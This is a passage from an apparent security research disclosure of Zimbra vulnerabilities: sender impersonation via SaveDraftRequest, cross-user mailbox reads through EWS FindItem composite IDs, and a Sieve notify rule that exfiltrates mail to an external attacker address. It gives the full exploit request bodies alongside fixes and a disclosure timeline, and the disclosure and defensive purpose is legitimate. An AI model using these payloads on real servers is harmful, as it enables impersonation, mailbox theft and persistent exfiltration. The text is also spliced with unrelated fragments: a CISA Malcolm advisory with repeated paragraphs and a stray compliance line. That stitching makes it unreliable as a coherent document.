folder. The target must be on the same mailbox server, but the attack requires no optional Zimbra feature, existing delegation, administrator right or victim action. Technical Analysis Claimed sender becomes mailbox authority After the request parser extracts the From address, the delegated branch resolves that address to a local account and reads an optional delegateeAccountId : // SaveDraft.handle() excerpt // ... message fields, From address and delegation attributes parsed above if (mailAddress != null) { delegatorAccount = prov.get( Key.AccountBy.name, mailAddress, zsc.getAuthToken()); // [0] account named by From } if (isDelegatedReq) { delegatorMbox = MailboxManager.getInstance() .getMailboxByAccountId(delegatorAccount.getId()); Account delegateeAccount = null; OperationContext oct = null; if (delegateeAccountId != null) { delegateeAccount = prov.getAccountById(delegateeAccountId); oct = new OperationContext(delegateeAccount); // [1] supplied account context } else if (delegatorMbox != null) { oct = new OperationContext(delegatorMbox); // [2] claimed sender context } if (oct != null && delegatorMbox != null) { mm = ParseMimeMessage.parseMimeMsgSoap( zsc, oct, delegatorMbox, msgElem, null, mimeData); boolean deliveryReport = false; // ... optional delivery-report update omitted SendMsg.doSendMessage(oct, delegatorMbox, mm, mimeData.uploads, null, "r", null, null, false, false, false, deliveryReport); // [3] platform delivery } // ... response construction omitted } There is no checkRight() , canAccessAccount() , or canSendAs() call between resolving the account at [0] and delivery at [3] . In the demonstrated request, delegateeAccountId is absent. At [2] , Zimbra constructs the operation context from the mailbox named in From , causing the later send to treat the selected account as the caller. [3] then submits the message through Zimbra's legitimate sending path. There is a second way to trigger the flaw. The attacker can supply the claimed sender's account UUID in delegateeAccountId . At [1] , Zimbra constructs the operation context directly from that account and reaches the same impersonation result without checking the identity that was actually signed in. Exploitation Sending as a local identity The relevant SaveDraftRequest body is: <SaveDraftRequest xmlns="urn:zimbraMail" isDelegatedReq="1"> <m> <e t="t" a="recipient@example.test"/> <e t="f" a="ceo@example.test"/> <su>Updated payroll review</su> <mp ct="text/plain"><content>Please review the changes.</content></mp> </m> </SaveDraftRequest> Because Zimbra submits the message through its legitimate infrastructure, the issue goes beyond display-name spoofing. On a deployment whose legitimate outbound mail passes SPF, DKIM, and DMARC, the impersonated message passes them too: it uses the same source MTA, signing domain, RFC sender, and envelope sender as legitimate mail from the selected account. Local testing confirmed that sender alignment and normal MTA path. The CVE-2026-73571 PoC submits the delegated request with an operator-selected sender, recipient, subject and message body. On the affected build, the message arrived with the CEO as its RFC sender, and the same subject appeared in the CEO's Sent folder. Figure 2: The victim's Inbox displays the forged message as an ordinary internal email from the CEO. Impact An attacker can impersonate any local user, not only an administrator or executive. Internally, that allows believable payment requests, changes to account details, malicious links, false instructions and fraudulent approvals. Normal display-name spoofing warnings and external-sender banners do not help because Zimbra submits the message as the selected local user. Zimbra also places the forged message in the impersonated user's Sent folder. This leaves a fabricated record of authorship and can support an attempt to frame that user. Figure 3: The same forged message is recorded in the CEO's Sent folder. For external recipients, the attacker can send from a finance account to request new payment details, use an operations account to cancel or alter an order, or send scams and abusive mail under an employee's address. The consequences depend on the role and relationships of the selected sender. The same trusted-delivery advantage applies to exploit-bearing mail. The next article will examine browser-side findings that an attacker can deliver from any chosen local account. Impersonation is not required for the XSS itself, but can make the message appear to come from somebody the recipient trusts. Fix The patch in ZCS 10.1.17 retains the account that actually signed in unless it has an explicit send-as or send-on-behalf-of right. An unauthorized delegated request consequently runs as the caller rather than the account named in the message. EWS cross-user mailbox access (CVE-2026-10631) Zimbra's EWS extension uses composite folder IDs intended for shared-mailbox operations. FindItem trusts the owner UUID inside an attacker-supplied ID and constructs the authorization context from the selected mailbox instead of the account that signed in. This Insecure Direct Object Reference (IDOR) lets any ordinary EWS-enabled account read complete items from other users' mailboxes without a share or delegation grant. The attacker needs zimbraFeatureEwsEnabled=TRUE . Although disabled by default, deployments using Zimbra's Outlook desktop integration commonly enable EWS class-of-service-wide. The target account does not need EWS enabled, and no target-user action is required. Technical analysis Composite IDs select the mailbox To address a shared item, EWS needs to identify both the mailbox that owns it and the item or folder inside that mailbox. Zimbra encodes this as {ownerUUID}_{numericId} . For example: 5e05e6e2-8810-4c2a-a7ac-3771df62e344 _2 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^ owner UUID +-- folder 2 (Inbox) When FindItem receives a composite ID, FolderUtil.parseItemId() separates the owner and numeric portions. The owner value is then passed to ItemUtil.getGrantorMailbox() : // ItemUtil.getGrantorMailbox() public static Mailbox getGrantorMailbox(String ownerId) throws ServiceException { Provisioning prov = Provisioning.getInstance(); Account ownerAcct = prov.get(Key.AccountBy.id, ownerId); // [0] supplied owner UUID Mailbox mailboxOwnr = MailboxManager.getInstance() .getMailboxByAccount(ownerAcct); // [1] selected mailbox return mailboxOwnr; } At [0] , EWS resolves the supplied owner UUID to a local account; [1] retrieves that account's mailbox. Neither method receives the caller's identity. The mailbox becomes the authenticated identity The authenticated account and selected mailbox are then passed to ItemOperation : // ItemOperation.ItemOperation() public ItemOperation(Account account, Mailbox mailbox, ZimbraAuth zimbraAuth) throws ServiceException { this.account = account; // [2] authenticated attacker this.mailbox = mailbox; // [3] selected owner's mailbox this.octxt = mailbox == null ? new OperationContext(account) : new OperationContext(mailbox); // [4] selected owner context this.zimbraAuth = zimbraAuth; this.octxt.setUserAgent(zimbraAuth.getUserAgent()); } [2] is the attacker account. Supplying a victim UUID makes [3] the victim mailbox, so it is not null. [4] therefore creates OperationContext from the victim mailbox instead of the attacker account. // OperationContext constructors public OperationContext(Mailbox mbox) throws ServiceException { this(mbox.getAccount()); // [5] target mailbox owner } public OperationContext(Account acct) { this(acct, false); } public OperationContext(Account acct, boolean admin) { this.authuser = acct; // [6] identity used for permission checks // ... remaining context initialization omitted } [5] extracts the victim account from that mailbox, and [6] stores the victim as the authenticated user. The mailbox then compares this identity with its owner: // Mailbox.getAuthenticatedAccount() Account getAuthenticatedAccount() { // ... context and authenticated-user lookup omitted if (authuser != null && authuser.getId().equals(this.getAccountId())) { authuser = null; // [7] matching identity is treated as owner access } return authuser; } The identities match, so [7] changes the authenticated user to null, which downstream checks treat as owner access. The attacker's request is consequently authorized as the victim. EWS has used the untrusted owner UUID both to select a mailbox and to decide who is authenticated. The numeric folder ID is subsequently resolved within that owner context, allowing FindItem to access any folder in the selected mailbox. Exploitation Resolving a target mailbox A target UUID is available through ordinary authenticated directory lookups. Both GetAccountInfoRequest and SearchGalRequest return zimbraId for a known local address. The PoC uses GetAccountInfoRequest : <GetAccountInfoRequest xmlns="urn:zimbraAccount"> <account by="name">victim@example.test</account> </GetAccountInfoRequest> The response contains the target's UUID: <attr name="zimbraId"> 5e05e6e2-8810-4c2a-a7ac-3771df62e344 </attr> Appending _2 to the UUID forms the target's Inbox identifier. The attacker sends the following EWS request to /service/extension/zimbraews , or to /EWS/Exchange.asmx when EWS is exposed through Zimbra's standard proxy: <m:FindItem Traversal="Shallow" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"> <m:ItemShape> <t:BaseShape>AllProperties</t:BaseShape> <t:IncludeMimeContent>true</t:IncludeMimeContent> </m:ItemShape> <m:IndexedPageItemView MaxEntriesReturned="5" Offset="0" BasePoint="End"/> <m:ParentFolderIds> <t:FolderId Id="5e05e6e2-8810-4c2a-a7ac-3771df62e344_2"/> </m:ParentFolderIds> </m:FindItem> The server returns the selected mailbox's data in the EWS response: <ns2:Message xmlns:ns2="http://schemas.microsoft.com/exchange/services/2006/types"> <!-- Complete base64 MIME and other returned fields omitted. --> <ns2:ItemId Id="5e05e6e2-8810-4c2a-a7ac-3771df62e344_380" ChangeKey="600"/> <ns2:Subject>Project Phoenix acquisition timeline</ns2:Subject> <ns2:Body BodyType="Text">The target accepted the preliminary terms. Board approval is due Friday. Keep this strictly confidential.</ns2:Body> <ns2:HasAttachments>true</ns2:HasAttachments> <ns2:From><ns2:Mailbox> <ns2:EmailAddress>finance@northbridge.example</ns2:EmailAddress> </ns2:Mailbox></ns2:From> <ns2:InternetMessageId><20261005150023.563F6400B9@mail.lab.local></ns2:InternetMessageId> </ns2:Message> The CVE-2026-10631 PoC obtains that UUID and creates the composite ID automatically. Cross-account folder reads Changing the numeric component selects another well-known folder: Folder Crafted ID Unauthorized result Inbox {uuid}_2 Received messages and attachments Sent {uuid}_5 Messages sent by the target Drafts {uuid}_6 Unfinished messages Contacts {uuid}_7 Address-book entries Calendar {uuid}_10 Appointments and meeting data If the target mailbox is on another server in the same Zimbra cluster, the first server forwards the crafted request. The receiving server resolves its local mailbox from the same owner UUID and reaches the vulnerable FindItem constructor. The CVE-2026-10631 tracker entry covers the full response, affected folders and multi-server path in detail. Impact EWS exposes the victim's private message bodies and attachments, as well as drafts, sent mail, contacts and calendar data. The attacker can monitor conversations and use their history to make the separate impersonation attack more credible. An attacker can also request a password reset for another service, monitor the corresponding mailbox and consume the link. EWS does not bypass third-party MFA by itself, but it exposes an email channel that many services still treat as sufficient proof. Because the owner UUID is attacker-selected, the same ordinary EWS account can repeat these reads against other local mailboxes. Note that an earlier version of this analysis, presented at BruCON 2026 , attributed GetItem , send, move and delete to the same flaw. Comparing intermediate Network Edition releases during this research required multiple restored VM appliances, because EWS is license-gated and normal patching advances the complete system; one appliance retained a separate mailbox authorization state that obscured the boundary, which initially made the impact appear broader . Repeating each operation with explicit authorization and target-state controls narrowed the CVE to FindItem , which still exposes complete MIME and attachments. Fix The patch in ZCS 10.1.20 creates the EWS authorization context from the account that signed in, not the mailbox selected by the composite ID. Zimbra applied that correction to both local and remote mailbox operations. Sieve notify forwarding-restriction bypass (CVE-2026-50055) zimbraFeatureMailForwardingInFiltersEnabled=FALSE is meant to stop users creating server-side mail-forwarding rules. Zimbra enforces it by rejecting Sieve redirect , but accepts notify even though that action can send selected headers and the complete text body to an arbitrary external address. An authenticated user can therefore install persistent mail exfiltration despite the administrator's restriction. If forwarding is normally allowed, there is no policy boundary to bypass. Technical analysis Redirect is the only blocked action Both the ModifyFilterRulesRequest and ModifyOutgoingFilterRulesRequest SOAP commands call checkForwardFilterAttr() before saving a rule. The check recognizes only one action type: // DocumentHandler.checkForwardFilterAttr() public boolean checkForwardFilterAttr(Account account, List<FilterRule> filterRules, String filterRuleType) throws ServiceException { if (!account.isFeatureMailForwardingInFiltersEnabled() && !filterRules.isEmpty()) { for (FilterRule filterRule : filterRules) { if (!Objects.requireNonNull(filterRule.getFilterActions()).stream() .anyMatch(FilterAction.RedirectAction.class::isInstance) // [0] redirect only || this.checkIfFilterAlreadyExists(filterRule, account, filterRuleType)) continue; return false; } } return true; // [1] all other actions allowed } At [0] , the policy classifies only RedirectAction as forwarding, meaning NotifyAction and RFCCompliantNotifyAction reach [1] even though they can send attacker-selected message content to an external email address. Notify expands message content These actions can include message content rather than just a generic alert because SoapToSieve.getSieveScript() enables the variables and enotify extensions. FilterUtil.getVarsMap() then supplies the values available to the notification: // FilterUtil.getVarsMap() excerpt // ... case-insensitive variable-map construction omitted Enumeration enumeration = mimeMessage.getAllHeaders(); while (enumeration.hasMoreElements()) { Header header = (Header)enumeration.nextElement(); vars.put(header.getName().toLowerCase(), ZInternetHeader.decode( mimeMessage.getHeader(header.getName(), ","))); // [2] decoded headers } vars.put("subject", parsedMessage.getSubject()); MPartInfo bodyPart = Mime.getTextBody(parsedMessage.getMessageParts(), false); if (bodyPart != null) { // ... IOException handling omitted vars.put("body", Mime.getStringContent( bodyPart.getMimePart(), mailbox.getAccount().getPrefMailDefaultCharset())); // [3] selected text body } return vars; When the rule runs, Notify.executeBasic() expands those variables into the notification subject and body. [2] makes decoded headers available, and [3] supplies the text part selected by Mime.getTextBody() . It does not supply raw MIME or attachments. Exploitation Installing persistent exfiltration An authenticated user can place the following rule object inside ModifyFilterRulesRequest : <filterRule name="Email Notification" active="1"> <filterTests condition="allof"><trueTest/></filterTests> <filterActions> <actionNotify a="attacker@external.example" su="Fwd: ${subject}" content="From: ${from} To: ${to} Subject: ${subject} ${body}"/> <actionKeep/> </filterActions> </filterRule> actionKeep leaves the original message in the user's Inbox, while each matching delivery sends the selected message text and headers to the external address. The CVE-2026-50055 PoC preserves existing filters while installing the notify rule. After an ordinary message arrived for the filtered account, another mailbox received its subject, sender, recipients, date and complete text body. The CVE-2026-50055 tracker entry has the complete affected-version information. Figure 4: The notification delivered to the attacker contains the subject, headers and complete text body of the victim's message. Hidden from Modern The persistence is not apparent in Modern. During testing, the server returned the active notification rule while the same account's Filters view remained empty. The server continued to run the rule normally, but Modern did not give the account owner a way to discover or remove it. Figure 5: Modern's Filters view does not display the active Sieve notify rule. Classic did list the attacker-selected name under Active Filters, but its overview did not expose the notification address or copied fields. The rule is therefore not invisible from every client, and an attacker can choose a less conspicuous name. Figure 6: Classic displays the attacker's rule name but not the external destination or copied fields. Impact The flaw defeats an administrator's attempt to prevent users from forwarding mail with server-side filters. An attacker with an authenticated session can install the rule directly. It continues to disclose future message text and headers after that session expires or the password changes, without appearing in Modern's Filters view. It does not forward attachments or raw MIME. Fix The patch in ZCS 10.1.20 treats notify and its RFC-compliant variant as forwarding actions and rejects them under the same account policy as redirect . Remediation Apply the latest supported Zimbra release. Zimbra's security advisory lists CVE-2026-73571 as fixed in ZCS 10.1.17 and CVE-2026-10631 and CVE-2026-50055 as fixed in ZCS 10.1.20. No fixed release is publicly listed for CVE-2026-93635 or CVE-2026-93637 at the time of publication, so install the security update containing those fixes when Zimbra releases it. Upgrading does not remove filter rules already saved to accounts. Administrators should inspect the stored incoming and outgoing filter rules for external actionNotify and RFC-compliant notify actions that violate forwarding policy; Modern's Filters view is not sufficient for this review. Detection and Incident Response A reverse proxy or web application firewall that inspects request bodies can detect multiple authenticate aliases in one anonymous GraphQL request. Zimbra's EWS logs expose cross-user operations involving two different account UUIDs, as shown in the EWS IoCs . Saved notify rules and outbound notification traffic provide more direct evidence of the Sieve path. EWS creates no delegation grant to revoke, Sieve rules remain as saved account state, and sender impersonation can generate ordinary Sent and MTA artifacts. Recovery must cover those server-side changes and any other mailbox reached, not only the password of the account first compromised. Credit The assessment was conducted by Jonah Burgess ( CryptoCat ), Senior Security Researcher at Rapid7, in accordance with Rapid7's vulnerability disclosure policy . Disclosure timeline April 17, 2026: Rapid7 submitted an initial report covering 23 findings. April 24, 2026: Zimbra acknowledged the report. May 21, 2026: Zimbra confirmed they validated 10 of the 23 findings, three of which were duplicates. May 28, 2026: ZCS 10.1.17 fixed CVE-2026-73571. June 1, 2026: Zimbra requested an embargo on publication until the planned ZCS 10.1.18 release in September. June 16 and July 7, 2026: ZCS 10.1.18 and 10.1.19 were released without additional fixes from the initial report. July 15, 2026: Zimbra and Rapid7 agreed on September 24 as the coordinated disclosure date. July 20, 2026: ZCS 10.1.20 fixed three additional CVE-assigned findings from the initial report: CVE-2026-50054, CVE-2026-10631 and CVE-2026-50055. August 19, 2026: Rapid7 submitted a second report containing 32 additional findings. August 31, 2026: Rapid7 and Zimbra met to prioritize remediation and discuss patch verification. September 8, 2026: Rapid7 submitted a third report containing 25 lower-priority findings. September 17–18, 2026: Zimbra requested 90 days from receipt of the later report before publication of full technical details. Rapid7 scheduled those later findings for November 23. September 24, 2026: ZCS 10.1.21 fixed four findings from the second report. Rapid7 presented selected results and attack chains at BruCON without releasing the associated weaponized PoCs.

summary: View CSAF Summary The following versions of CISA Malcolm are affected: Malcolm <=v26.07.1 (CVE-2026-107336, CVE-2026-107361, CVE-2026-107337, CVE-2026-107335, CVE-2026-107334) Malcolm <=v26.08.0 (CVE-2026-107333, CVE-2026-107362) CVSS Vendor Equipment v3 8.1 CISA Malcolm 6 Vulnerabilities Authentication Bypass by Spoofing, Incorrect Authorization, Server-Side Request Forgery (SSRF), Authentication Bypass Using an Alternate Path or Channel, Cross-Site Request Forgery (CSRF), Improper Handling of Highly Compressed Data (Data Amplification) Background Critical Infrastructure Sectors: Energy, Information Technology, Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-107336 Malcolm's front nginx reverse proxy defines a "Dashboards → Arkime shortcut" location using a case-insensitive regex matcher but a case-sensitive rewrite. A request whose path segment is not exact-lowercase (for example /IDDASH2ARK/...) enters the location (the matcher fires) but evades the rewrite (no redirect is issued), so nginx falls through to the location's proxy_pass to the Arkime backend. That location is the one proxied location in the shipped config that does not include the per-location authentication file, so the request reaches Arkime unauthenticated. The same location also forwards a client-supplied X-Forwarded-User header un-overwritten, and Arkime is configured to trust X-Forwarded-User as the authenticated username — so an unauthenticated network caller can reach the Arkime backend while supplying a forged, auto-provisioned identity. Recommended Practices CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities. Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet. Locate control system networks and remote devices behind firewalls and isolating them from business networks. Recommended Practices CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities. Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet. Locate control system networks and remote devices behind firewalls and isolating them from business networks. When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices. CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures. CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies. Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies. Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents. CISA also recommends users take the following measures to protect themselves from social engineering attacks: Do not click web links or open attachments in unsolicited email messages. Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams. Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks. No known public exploitation specifically targeting these vulnerabilities has been reported to CISA at this time. summary: Most compliance work goes into proving security, not improving it. That isn’t because the rules are unreasonable.
